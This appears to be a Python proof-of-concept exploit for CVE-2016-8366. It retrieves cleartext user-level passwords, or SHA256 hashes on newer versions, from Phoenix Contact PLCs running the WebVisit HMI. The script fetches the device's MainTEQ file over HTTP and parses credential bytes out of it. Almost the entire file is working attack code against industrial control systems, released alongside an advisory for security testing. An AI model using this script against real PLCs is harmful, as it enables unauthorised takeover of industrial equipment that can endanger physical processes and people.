#! /usr/bin/env python3
r''' 
	Copyright 2018 Photubias(c)

        This program is free software: you can redistribute it and/or modify
        it under the terms of the GNU General Public License as published by
        the Free Software Foundation, either version 3 of the License, or
        (at your option) any later version.

        This program is distributed in the hope that it will be useful,
        but WITHOUT ANY WARRANTY; without even the implied warranty of
        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
        GNU General Public License for more details.

        You should have received a copy of the GNU General Public License
        along with this program.  If not, see <http://www.gnu.org/licenses/>.

        File name CVE-2016-8366.py
        written by tijl[dot]deneut[at]howest[dot]be

        In cooperation with Lars De Maesschalck, Michael De Vos and Robbe Vuylsteke

        More info:
        https://ics-cert.us-cert.gov/advisories/ICSA-313-01
        Phoenix Contact WebVisit < 6.40.00 suffers of a Cleartext Password Disclosure bug
        Fix: PC WORX 1.84
        https://www.phoenixcontact.com/online/portal/nl/?uri=pxc-oc-itemdetail:pid=2985725&library=nlnl&pcck=P-19-05-01&tab=5
        
        This script will perform retrieval of clear text credentials for a Phoenix Contact PLC
		with a WebVisit GUI, password protected, application on it
		Tested on the Phoenix Contact ILC-390 PLC, but others are surely equally vulnerable
		
		Sample output:
		C:\Users\admin\Desktop>CVE-2016-8366.py
		Please enter an IP [172.20.3.10]:
		This is the password for userlevel 1: pw1
		This is the password for userlevel 2: SuperPass2
		This is the password for userlevel 3: Extreme2TheMax3
		This is the password for userlevel 4: PowerPass4
		Press Enter to exit
'''
import urllib.request, sys

def reverseByte(xInputData): ## Will return input b'12345678' as b'78563412' and '12345678' as '78563412'
    if isinstance(xInputData, bytes): return b''.join([xInputData[x:x+2] for x in range(0,len(xInputData),2)][::-1])
    else: return ''.join([xInputData[x:x+2] for x in range(0,len(xInputData),2)][::-1])

if len(sys.argv) > 1: 
    sIP = sys.argv[1]
    if 'h' in sIP: exit('Usage: {} <HMI-IP>'.format(sys.argv[0]))
else: sIP = input('Please enter an IP [192.168.0.1]: ')
if sIP == '': sIP = '192.168.0.1'

try:
    oResponse = urllib.request.urlopen('http://{}'.format(sIP), timeout = 5)
except:
    input('[-] ## Critical Error with IP {}: no response\nPress Enter to exit'.format(sIP))
    exit()

sMainTEQ = ''
for bLine in oResponse.readlines():
    if b'MainTEQName' in bLine:
        sMainTEQ = bLine.split(b'VALUE="')[1].split(b'"')[0].decode(errors='ignore')

if sMainTEQ == '':
    input('[-] ## Erro, no "MainTEQ" found on the main page\nPress Enter to exit')
    exit()

try:
    oLoginTeqResponse = urllib.request.urlopen('http://{}/{}'.format(sIP, sMainTEQ), timeout = 5)
except:
    input('[-] ## Critical Error with IP {}: File "" not found\nPress Enter to exit'.format(sIP, sMainTEQ))
    exit()

bAlldata = b''
for bLine in oLoginTeqResponse.readlines(): bAlldata += bLine

## For vulnerable webvisit:
## Seems to be 'userLevel' + x bytes + 1 + y bytes + 'password'
## userLevel + '0506030001' + 31 + '00030003010301068300' + passlength + 'password'
## For WebVisit > 6.40.00
## userLevel + '0003000301030b06830040' + 'SHA256' (wich is 64 bytes)
for bLine in bAlldata.split(b'userLevel\x05\x06\x03\x00\x01'):
    if b'\x00\x03\x00\x03\x01\x03\x01\x06\x83\x00' in bLine:  ## Cleartext password
        sUserlevel = bLine[:1].decode()
        iPassLength = int(bLine.split(b'\x00\x03\x00\x03\x01\x03\x01\x06\x83\x00')[1][:1].hex(), 16)
        sPassword = bLine.split(b'\x00\x03\x00\x03\x01\x03\x01\x06\x83\x00')[1][1:1+iPassLength].decode(errors='ignore')
        print('Password for user level {}: {}'.format(sUserlevel, sPassword))
    elif b'\x00\x03\x00\x03\x01\x03\x0b\x06\x83\x00@' in bLine:  ## Hash format
        sUserlevel = bLine[:1].decode()
        sHash = bLine.split(b'\x00\x03\x00\x03\x01\x03\x0b\x06\x83\x00@')[1][:64].decode()
        print('Hash for userlevel {}: {}'.format(sUserlevel, sHash))

if len(sys.argv) == 1: input('Press Enter to exit')
